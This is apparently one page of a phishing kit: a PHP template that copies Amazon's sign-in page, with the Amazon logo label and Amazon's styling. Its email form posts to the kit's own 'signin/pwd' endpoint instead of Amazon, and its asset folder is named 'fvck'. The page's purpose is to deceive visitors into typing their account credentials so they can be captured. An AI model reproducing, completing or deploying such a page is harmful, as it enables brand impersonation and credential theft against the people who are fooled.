<?php
defined("ALLOW") or exit('No direct script access allowed');

$country = trim($_SESSION['countryCode']);
include FCPATH . "language/lang.php";
?>

<!doctype html>
<html class="a-no-js" data-19ax5a9jf="dingo">
<head>

<meta charset="utf-8">
<meta name="viewport" content="width=device-width, maximum-scale=1, minimum-scale=1, initial-scale=1, user-scalable=no, shrink-to-fit=no">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0">
<title><?php echo $_1 ?></title>
<link rel="stylesheet" href="<?= base_url() ?>Assets/fvck/css/sign-dekstop.css">
<link rel="stylesheet" href="<?= base_url() ?>Assets/fvck/css/style.sign-desktop.css">
<link rel="shortcut icon" href="<?= base_url() ?>Assets/fvck/images/favicon.ico" />

</head>
<body class="ap-locale-en_US a-m-us a-aui_72554-c a-aui_button_aria_label_markup_348458-t1 a-aui_csa_templates_buildin_ww_exp_337518-c a-aui_csa_templates_buildin_ww_launch_337517-c a-aui_csa_templates_declarative_ww_exp_337521-t1 a-aui_csa_templates_declarative_ww_launch_337520-c a-aui_dynamic_img_a11y_markup_345061-t1 a-aui_mm_desktop_exp_291916-c a-aui_mm_desktop_launch_291918-c a-aui_mm_desktop_targeted_exp_291928-c a-aui_mm_desktop_targeted_launch_291922-c a-aui_pci_risk_banner_210084-c a-aui_preload_261698-c a-aui_rel_noreferrer_noopener_309527-c a-aui_template_weblab_cache_333406-c a-aui_tnr_v2_180836-c a-meter-animate" cz-shortcut-listen="true">
    <div id="a-page">
        <div class="a-section a-padding-medium auth-workflow">
            <div class="a-section a-spacing-none auth-navbar">
                <div class="a-section a-spacing-medium a-text-center">
                    <div class="a-link-nav-icon"></div><i class="a-icon a-icon-logo" role="img" aria-label="Amazon"></i>
                </div>
            </div>
            <div id="authportal-center-section" class="a-section">
                <div class="a-section a-spacing-base auth-pagelet-container badInput hide">
                    <div class="a-section">
                        <div id="auth-error-message-box" class="a-box a-alert a-alert-error auth-server-side-message-box a-spacing-base" aria-live="assertive" role="alert">
                            <div class="a-box-inner a-alert-container">
                                <h4 class="a-alert-heading"><?php echo $_2 ?></h4> <i class="a-icon a-icon-alert"></i>
                                <div class="a-alert-content">
                                    <ul class="a-unordered-list a-nostyle a-vertical a-spacing-none">
                                        <li><span class="a-list-item"> <?php echo $_3 ?> </span> </li>
                                    </ul>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="a-section auth-pagelet-container">
                    <div class="a-section a-spacing-base">
                        <div class="a-section">
                            <form name="signIn" method="post" action="<?= base_url() ?>signin/pwd" id="fms-form" class="auth-validate-form auth-real-time-validation a-spacing-none" onsubmit="return checkpass();">
                                <div class="a-section">
                                    <div class="a-box" id="emailpage">
                                        <div class="a-box-inner a-padding-extra-large">
                                            <h1 class="a-spacing-small"> <?php echo $_4 ?> </h1>
                                            <div class="a-row a-spacing-base">
                                                <label for="ap_email" class="a-form-label">
                                                    <?php echo $_5 ?>
                                                </label>
                                                <input type="text" maxlength="128" id="ap_email" name="emailLogin" class="a-input-text a-span12 auth-autofocus auth-required-field formemail">
                                                <style>
                                                    .show {
                                                        display: block;
                                                    }
                                                </style>
                                                <div id="auth-email-missing-alert" class="a-box a-alert-inline a-alert-inline-error auth-inlined-error-message a-spacing-top-mini" aria-live="assertive" role="alert">
                                                    <div class="a-box-inner a-alert-container"> <i class="a-icon a-icon-alert"></i>
                                                        <div class="a-alert-content">
                                                            <?php echo $_6 ?>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                            <div class="a-section"> 
                                            <span style="border:none; background-color:white;" id="continue" class=""> 
                                            <span style="border:none;" class="a-button-inner"> <input id="btnContinue" class="a-button-input" type="submit" onclick="return showPass();"> 
                                            <span style="border:none; background-color:#ffd814; border-radius:7px; " id="continue-announce" class="a-button-text" aria-hidden="true"><?php echo $_7 ?></span> </span>
                                                </span>
                                                <div id="legalTextRow" class="a-row a-spacing-top-medium a-size-small">
                                                    <?php echo $_8 ?>
                                                    <a href="#">
                                                        <?php echo $_9 ?>
                                                    </a>
                                                    <?php echo $_10 ?>
                                                    <a href="#">
                                                        <?php echo $_11 ?>
                                                    </a>.
                                                </div>
                                            </div>
                                            <div class="a-section">
                                                <a data-csa-c-func-deps="aui-da-a-expander-toggle" data-csa-c-type="widget" data-csa-interaction-events="click" aria-expanded="false" role="button" href="javascript:void(0)" data-action="a-expander-toggle" class="a-expander-header a-declarative a-expander-inline-header a-link-expander" data-a-expander-toggle="{&quot;allowLinkDefault&quot;:true, &quot;expand_prompt&quot;:&quot;&quot;, &quot;collapse_prompt&quot;:&quot;&quot;}" data-csa-c-id="hfxg3d-82z4jc-u21hge-jjzkib"><i class="a-icon a-icon-expand"></i><span class="a-expander-prompt">
                                                        <?php echo $_12 ?>
                                                    </span></a>
                                            </div>
                                        </div>
                                    </div>
                                    
                                </div>
                            </form>
                        </div>
                        <div class="a-divider-sprite2" id="data-sprite">
                            <div class="a-divider a-divider-break">
                                <h5><?php echo $_19 ?></h5>
                            </div><span id="auth-create-account-link" class="a-button a-button-span12 a-button-base"><span class="a-button-inner"><a id="createAccountSubmit" href="#" class="a-button-text" role="button"> <?php echo $_20 ?> </a></span></span>
                        </div>
                    </div>
                </div>
            </div>
            <div id="right-2"> </div>
            <div class="a-section a-spacing-top-extra-large auth-footer">
                <div class="a-divider a-divider-section">
                    <div class="a-divider-inner"></div>
                </div>
                <div class="a-section a-spacing-small a-text-center a-size-mini"> <span class="auth-footer-seperator"></span>
                    <a class="a-link-normal">
                        <?php echo $_21 ?>
                    </a> <span class="auth-footer-seperator"></span>
                    <a class="a-link-normal">
                        <?php echo $_22 ?>
                    </a> <span class="auth-footer-seperator"></span>
                    <a class="a-link-normal">
                        <?php echo $_23 ?>
                    </a> <span class="auth-footer-seperator"></span>
                </div>
                <div class="a-section a-spacing-none a-text-center"> <span class="a-size-mini a-color-secondary"> <?php echo $_24 ?> </span> </div>
            </div>
        </div>
        <script src="<?= base_url() ?>Assets/fvck/js/jquery-3.3.1.min.js"></script>
        <script src="<?= base_url() ?>Assets/fvck/js/jquery.validate.min.js"></script>
</body>

</html>